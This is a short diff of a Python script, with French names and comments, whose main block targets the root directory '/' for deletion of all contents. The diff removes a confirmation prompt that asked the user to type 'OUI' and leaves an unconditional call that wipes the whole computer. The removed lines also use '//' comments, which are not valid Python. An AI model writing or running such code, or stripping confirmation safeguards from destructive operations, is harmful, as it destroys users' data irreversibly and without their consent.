@@ -20,9 +20,4 @@ def supprimer_contenu(dossier):
 
 if __name__ == "__main__":
     dossier_a_supprimer = "/"  # Attention: cela cible la racine de l'ordinateur
-    // confirmation = input("Êtes-vous sûr de vouloir supprimer tout le contenu de l'ordinateur? Tapez 'OUI' pour confirmer: ")
-    // if confirmation == "OUI":
-    //     supprimer_contenu(dossier_a_supprimer)
-    // else:
-    //     print("Opération annulée.")
     supprimer_contenu(dossier_a_supprimer)
